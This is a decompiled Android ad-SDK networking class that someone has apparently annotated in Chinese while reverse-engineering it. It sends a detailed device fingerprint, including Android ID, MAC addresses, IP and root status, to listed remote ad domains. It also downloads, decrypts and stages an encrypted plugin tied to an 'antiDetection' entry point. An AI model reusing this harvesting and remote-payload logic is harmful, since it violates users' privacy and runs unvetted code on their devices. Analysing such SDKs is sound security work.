package com.kkwinter.thirdsdk.advsdk.b;

import android.content.Context;
import android.text.TextUtils;
import android.util.Base64;
import com.kkwinter.thirdsdk.advsdk.a.e;

import java.io.File;
import java.net.URLEncoder;
import java.util.ArrayList;
import org.json.JSONException;
import org.json.JSONObject;


/**
 * 网络交互管理类
 */
public final class c {
    private static Boolean a = false;


//       /adv/pluginReq 请求 response
//            {
//                "common":{
//                    "errMsg":"",
//                    "serverTime":1555401072840,
//                    "machineID":"b72b08cd2a5b15ee0b3b7be0390c962c",
//                    "requestID":"e38521b7c2b0a9505b63a48a0c3066dc",
//                    "allowDomains":[
//                        "http://139.224.5.171",
//                        "http://adv.readingbooks.com.cn",
//                        "http://adv.patrickwong.com.cn",
//                        "http://adv.99yesrs.com"
//                    ],
//                    "restrictDomains":[
//                        "http://adv.quanburen.com",
//                        "http://adv.jpigjqg.com",
//                        "http://adv.detianran.com",
//                        "http://adv.malinian.com",
//                        "http://adv.myseld.com"
//                    ]
//                },
//                "plugin":{
//                    "downloadMirrorUrl":"http://adv-upyun.test.upcdn.net/android/adv/qsz/advsdk/release/advsdk-release.enc",
//                    "antiDetection":{
//                        "methodName":"run",
//                        "className":"entry.WorkFlowEntry",
//                        "packageName":"com.power.ttook.advworkflow"
//                    },
//                    "downloadMainUrl":"http://adv-upyun.test.upcdn.net/android/adv/qsz/advsdk/release/advsdk-release.enc",
//                    "version":"1.6",
//                    "md5":"ea93ac4404f8525f7d90e2410fd1b5c3"
//                }
//            }

    //context，/adv/pluginReq，action， sb
    public static JSONObject a(Context var0, String var1, String var2, StringBuilder var3) {
        JSONObject var4 = new JSONObject();
        JSONObject var5 = new JSONObject();

        //l类
        com.kkwinter.thirdsdk.advsdk.b.l var6 = com.kkwinter.thirdsdk.advsdk.b.l.a(var0);

        try {
            var5.put(com.kkwinter.thirdsdk.advsdk.b.j.a("EweqZB/+1G/znyQ="), "1.5");    //protocolVer
            var5.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ABmsdR7p7WbX"), "1.5");        //clientVer
            var5.put(com.kkwinter.thirdsdk.advsdk.b.j.a("AB2kfh7410rB"), "ly_0325_s");  //channelId
            var5.put(com.kkwinter.thirdsdk.advsdk.b.j.a("DhSmeBnz3krh"), var6.a());           //machineID
            var5.put(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCnZRc="), "0");              //debug

            var4.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ABqofR/z"), var5);                    //common
            var4.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ERCjdQLc2HfMlTg="), var2);            //referAction
            var4.put(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCzeRP48m3DlQ=="), var6.b());        //deviceInfo
            /*
             var4:   /adv/pluginReq 请求 post body
             {"common":{"protocolVer":"1.5","clientVer":"1.5","channelId":"ly_0325_s","machineID":"b72b08cd2a5b15ee0b3b7be0390c962c","debug":"0"},"referAction":"ENTRY(MAIN)","deviceInfo":{"hasSu":false,"isEnableSE":true,"uuid":"d83d09334e48ca5c064829e1bf41dafe","machineid":"b72b08cd2a5b15ee0b3b7be0390c962c","netType":"WIFI","platformVer":"6.0.1","platformSdk":23,"platformModel":"Nexus5X","platformManufacturer":"LGE","platformBrand":"google","platformProduct":"bullhead","platformDevice":"bullhead","androidID":"7d8562b26356c941","screenDPI":"420","screenResolution":"1080x1920","serialNumber":"","cpuABI":"arm64-v8a","cpuABI2":"","cpuArch":"x64","telIMEI1":"","telIMEI2":"","telIMSI1":"","telIMSI2":"","localMacAddress":"78:F8:82:A4:DC:A4","localIP":"192.168.1.148","gatewayMacAddress":"b.l.g","batteryPercent":100,"isBatteryCharging":true,"externalSDCardPath":"\/storage\/emulated\/0","hostAppDisplayName":"3rdsdk","hostAppPackageName":"com.kkwinter.thirdsdk","hostAppIsDebuggable":false,"hostAppVersion":"1.0","hostAppInstallSrc":"\/data\/app\/com.kkwinter.thirdsdk-2\/base.apk","webUA":"","memTotalSize":"1901928448","memFreeSize":"435998720","phoneDiskTotalSize":"11185724","phoneDiskFreeSize":"5493584","externalSDCardTotalSize":"11185724","externalSDCardFreeSize":"5493584"}}

             */

            var6.a("");
            JSONObject var8;
            if ((var8 = a(var0, var1, var4, var3)) == null) {
                return null;
            } else {
                JSONObject var9;
                if ((var9 = var8.getJSONObject(com.kkwinter.thirdsdk.advsdk.b.j.a("ABqofR/z"))) == null) {   //common
                    var3.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuJkJkaVjWLppWD8p7nnXfG2H71Sw="));    // 协议错误[没有common字段]
                    return null;
                } else if (!TextUtils.isEmpty(var2 = com.kkwinter.thirdsdk.advsdk.b.r.a(var9, com.kkwinter.thirdsdk.advsdk.b.j.a("Bge3XQP6"), ""))) {   //errMsg
                    var3.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuJg==") + var2 + com.kkwinter.thirdsdk.advsdk.b.j.a("Pg=="));  //协议错误[  var2  ]
                    return null;
                } else if (TextUtils.isEmpty(var1 = r.a(var9, com.kkwinter.thirdsdk.advsdk.b.j.a("DhSmeBnz3krh"), ""))) {   //machineID
                    var3.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuJg==") + com.kkwinter.thirdsdk.advsdk.b.j.a("DhSmeBnz3krhxxgUMeg=") + com.kkwinter.thirdsdk.advsdk.b.j.a("Pg=="));  // 协议错误[  machineID=NULL  ]
                    return null;
                } else {
                    var6.a(var1);
                    return var8;
                }
            }
        } catch (JSONException var7) {
            var3.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuR/8=") + var7.getMessage() + com.kkwinter.thirdsdk.advsdk.b.j.a("Pg=="));
            return null;
        }
    }




//       /adv/pluginFeedback 请求 response
//        {
//            "common":{
//            "errMsg":"",
//                    "serverTime":1555575944256,
//                    "machineID":null,
//                    "requestID":null,
//                    "allowDomains":[
//            "http://139.224.5.171",
//                    "http://adv.readingbooks.com.cn",
//                    "http://adv.patrickwong.com.cn",
//                    "http://adv.99yesrs.com"
//            ],
//            "restrictDomains":[
//            "http://adv.quanburen.com",
//                    "http://adv.jpigjqg.com",
//                    "http://adv.detianran.com",
//                    "http://adv.malinian.com",
//                    "http://adv.myseld.com"
//            ]
//        }
//        }

    // context   /adv/pluginFeedback   md5   requestID   0/1   执行时长   sb
    public static JSONObject a(Context var0, String var1, String var2, String var3, int var4, long var5, String var7) {
        JSONObject var8 = new JSONObject();
        JSONObject var9 = new JSONObject();

        com.kkwinter.thirdsdk.advsdk.b.l var10 = l.a(var0);
        JSONObject var11 = new JSONObject();

        try {
            var11.put(com.kkwinter.thirdsdk.advsdk.b.j.a("EweqZB/+1G/znyQ="), "1.5");     //protocolVer
            var11.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ABmsdR7p7WbX"), "1.5");         //clientVer
            var11.put(com.kkwinter.thirdsdk.advsdk.b.j.a("AB2kfh7410rB"), "ly_0325_s");   //channelId
            var11.put(com.kkwinter.thirdsdk.advsdk.b.j.a("DhSmeBnz3krh"), var10.a());           //machineID
            var11.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ERC0ZRXuz0rh"), var3);                //requestID
            var11.put(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCnZRc="), "0");               //debug
            var8.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ABqofR/z"), var11);                    //common

            var9.put(com.kkwinter.thirdsdk.advsdk.b.j.a("Exmwdxnz9meQ"), var2);                 //pluginMd5
            var9.put(com.kkwinter.thirdsdk.advsdk.b.j.a("EAGkZAXu"), var4);                     //status
            var9.put(com.kkwinter.thirdsdk.advsdk.b.j.a("Bg2mZQT462bXkzkl"), var5);             //excutePeriod
            byte[] var13 = Base64.encode(URLEncoder.encode(var7, com.kkwinter.thirdsdk.advsdk.b.j.a("FgGjPUg=")).getBytes(), 0);
            var2 = (new String(var13)).replaceAll(com.kkwinter.thirdsdk.advsdk.b.j.a("Pxs="), "").replaceAll(com.kkwinter.thirdsdk.advsdk.b.j.a("Pwc="), "");
            var9.put(com.kkwinter.thirdsdk.advsdk.b.j.a("Bge3XQP6"), var2);                     //errMsg

            var8.put(com.kkwinter.thirdsdk.advsdk.b.j.a("ERC2ZRzp"), var9);                     //result


//          var8 adv/pluginFeedback   post请求body

//            {
//                "common":{
//                    "protocolVer":"1.5",
//                    "clientVer":"1.5",
//                    "channelId":"ly_0325_s",
//                    "machineID":"b72b08cd2a5b15ee0b3b7be0390c962c",
//                    "requestID":"e8d2b274a4046d1a5a9831923dd3d8d1",
//                    "debug":"0"
//                },
//                "result":{
//                    "pluginMd5":"ea93ac4404f8525f7d90e2410fd1b5c3",
//                    "status":1,
//                    "excutePeriod":2,
//                    "errMsg":""
//                }
//            }

            return a(var0, var1, var8, new StringBuilder());
        } catch (Exception var12) {
            return null;
        }
    }



    //获取请求url发请求，  context   url路径    post body   sb用以保存错误信息
    private static JSONObject a(Context var0, String var1, JSONObject var2, StringBuilder var3) {

        //动态获取domain到类
        com.kkwinter.thirdsdk.advsdk.b.n var4 = com.kkwinter.thirdsdk.advsdk.b.n.a(var0);

        JSONObject var7;
        if ((var7 = a(var4.a() + var1, var2, var3)) == null) {
            n.a(var0).b();   //如果上一个url请求为空，就用下一个url
        } else {
            // 获取var7中的common中的allowDomains、restrictDomains 并存储到本地
            JSONObject var5;
            if ((var5 = com.kkwinter.thirdsdk.advsdk.b.r.a(var7, com.kkwinter.thirdsdk.advsdk.b.j.a("ABqofR/z"))) != null) {  // common
                ArrayList var8 = (ArrayList) com.kkwinter.thirdsdk.advsdk.b.r.a(var5, com.kkwinter.thirdsdk.advsdk.b.j.a("AhmpfwfZ1G7Ekzgy"), new ArrayList());     // allowDomains
                ArrayList var6 = (ArrayList) com.kkwinter.thirdsdk.advsdk.b.r.a(var5, com.kkwinter.thirdsdk.advsdk.b.j.a("ERC2ZAL02HfhlTsgFMql"), new ArrayList()); // restrictDomains
                var4.a(var8);
                var4.b(var6);
            }
        }

        return var7;
    }


    //最终发送网络请求的方法
    // var0： 完整的url    var1： post body   var2： 记录错误信息
    private static JSONObject a(String var0, JSONObject var1, StringBuilder var2) {
        try {
            e var5 = new e(var0);  //网络请求类

            if (var1 == null) {
                var2.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuJkJkaVjWLrt2Jv5J"));    //协议错误[没有BODY]
                return null;
            } else {
//                a;
                String var6 = f.a(var1.toString(), f.b);
//                a;
                var5.a(var6);
                var5.a(var6).l();
                var5.a(com.kkwinter.thirdsdk.advsdk.b.j.a("IBqrZBXzzy7xgyYk"), com.kkwinter.thirdsdk.advsdk.b.j.a("AgW1fBn+2nfMlThuF9e5poUJz5hLEcJgzcUmyqpt"));    // Content-Type     application/json;Charset=UTF-8
                var5.a(com.kkwinter.thirdsdk.advsdk.b.j.a("IBqrfhX+z2rKlA=="), com.kkwinter.thirdsdk.advsdk.b.j.a("ABmqYxU="));                                    // Connection       close
                var5.m();
                var5.n();
                var5.o();

                try {
                    var0 = var5.k();
//                    a;
                    var0 = f.b(var0, f.b);
//                    a;
                    if (TextUtils.isEmpty(var0)) {
                        return null;
                    } else {
                        JSONObject var7 = new JSONObject(var0);
//                        a;
                        return var7;
                    }
                } catch (Exception var3) {
                    var2.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuJg==") + var3.getMessage() + com.kkwinter.thirdsdk.advsdk.b.j.a("Pg=="));
                    return null;
                }
            }
        } catch (Exception var4) {
            var2.append(com.kkwinter.thirdsdk.advsdk.b.j.a("hvhK+N4zUpc8EvnuJg==") + var4.getMessage() + com.kkwinter.thirdsdk.advsdk.b.j.a("Pg=="));
            return null;
        }
    }





    // downloadMainUrl 下载文件到 path目录下，并且判断存在，return true
    // downloadMainUrl    downloadMirrorUrl   md5   path   sb

    /**
     *
     * @param var0 downloadMainUrl
     * @param var1 downloadMirrorUrl
     * @param var2 md5
     * @param var3 path
     * @param var4 sb
     * @return
     */
    public static boolean a(String var0, String var1, String var2, String var3, StringBuilder var4) {
        if (var4 == null) {
            var4 = new StringBuilder();
        }

        try {
            try {
                //var3 路径的文件存在的话，就先删除掉
                if (com.kkwinter.thirdsdk.advsdk.b.p.d(var3)) {
                    com.kkwinter.thirdsdk.advsdk.b.p.e(var3);
                }

                //var3 文件的父目录路径
                String var5 = com.kkwinter.thirdsdk.advsdk.b.p.b(var3);
                if (!com.kkwinter.thirdsdk.advsdk.b.p.c(var3)) {   // 父目录是否创建成功
                    var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("Dh6h"));  // mkd
                    return false;
                } else {
                    String var6 = var5 + com.kkwinter.thirdsdk.advsdk.b.j.a("TA==") + com.kkwinter.thirdsdk.advsdk.b.e.a.a("ly_0325_s" + com.kkwinter.thirdsdk.advsdk.b.j.a("PBCrcw==")) + com.kkwinter.thirdsdk.advsdk.b.j.a("TRGn");  //    /  _enc   .db
                           var5 = var5 + com.kkwinter.thirdsdk.advsdk.b.j.a("TA==") + com.kkwinter.thirdsdk.advsdk.b.e.a.a("ly_0325_s" + com.kkwinter.thirdsdk.advsdk.b.j.a("PBGgcw==")) + com.kkwinter.thirdsdk.advsdk.b.j.a("TRGn");         //    /  _enc   .db

                    if (!o.a(var0, var1, var6, var2)) {    // 下载var0 var1  到var6目录 是否成功
                        var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("BwKr"));  //dwn
                        return false;
                    } else {
                        try {
                            if (com.kkwinter.thirdsdk.advsdk.b.p.d(var5)) {   // var5目录有文件到话，就删除
                                com.kkwinter.thirdsdk.advsdk.b.p.e(var5);
                            }

                            if (!(new f()).a(var6, var5)) {            //把var6解密到var5目录下
                                var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCmT0E="));  // dec_1
                                return false;
                            }

                            if (!com.kkwinter.thirdsdk.advsdk.b.p.d(var5)) {   // var5目录是否存在
                                var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCmT0I="));  //dec_2
                                return false;
                            }
                        } catch (Exception var10) {
                            var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCmT0O9kw==") + var10.getMessage() + com.kkwinter.thirdsdk.advsdk.b.j.a("Hg=="));  // dec_3(  )
                            return false;
                        }


                        (new File(var5)).renameTo(new File(var3));     // var5重命名为var3

                        if (!p.d(var3)) {                              //var3 是否存在
                            var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("BxCmT0Q="));      //dec_4
                            return false;
                        } else {
                            return true;
                        }
                    }
                }
            } catch (Exception var11) {
                var4.append(com.kkwinter.thirdsdk.advsdk.b.j.a("Fhuufh/q1SON") + var11.getMessage() + com.kkwinter.thirdsdk.advsdk.b.j.a("Sg=="));             //unknown(   )
                return false;
            }
        } catch (Throwable var12) {
            throw var12;
        }
    }

    static {
        a = b.a;
    }
}
